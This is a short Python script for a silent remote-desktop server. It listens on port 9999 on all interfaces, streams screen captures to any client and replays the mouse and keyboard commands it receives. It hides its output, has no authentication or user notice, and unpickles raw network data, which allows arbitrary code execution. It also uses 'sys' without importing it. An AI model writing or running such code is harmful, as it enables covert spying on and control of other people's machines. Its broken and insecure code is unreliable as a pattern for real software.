import os
import socket
import threading
import mss
import pyautogui
import io
import pickle
from PIL import Image

# Capture screen function (silent, without printing)
def capture_screen():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        sct_img = sct.grab(monitor)
        return Image.frombytes('RGB', sct_img.size, sct_img.rgb)

# Handle client connections (silent)
def handle_client(client_socket):
    while True:
        # Capture the screen
        screen = capture_screen()

        # Compress the image to save bandwidth
        img_bytes = io.BytesIO()
        screen.save(img_bytes, format='JPEG')
        img_bytes = img_bytes.getvalue()

        # Send the screen size followed by the image bytes
        client_socket.sendall(pickle.dumps(len(img_bytes)))
        client_socket.sendall(img_bytes)

        # Receive and execute commands (mouse movement, clicks, key presses)
        try:
            command = client_socket.recv(4096)
            if command:
                command = pickle.loads(command)
                if command['type'] == 'move_mouse':
                    pyautogui.moveTo(command['x'], command['y'])
                elif command['type'] == 'click':
                    pyautogui.click()
                elif command['type'] == 'keypress':
                    pyautogui.press(command['key'])
        except:
            break

# Silent background server
def start_server():
    # Suppress print output by redirecting to os.devnull
    f = open(os.devnull, 'w')
    sys.stdout = f
    sys.stderr = f

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    start_server()
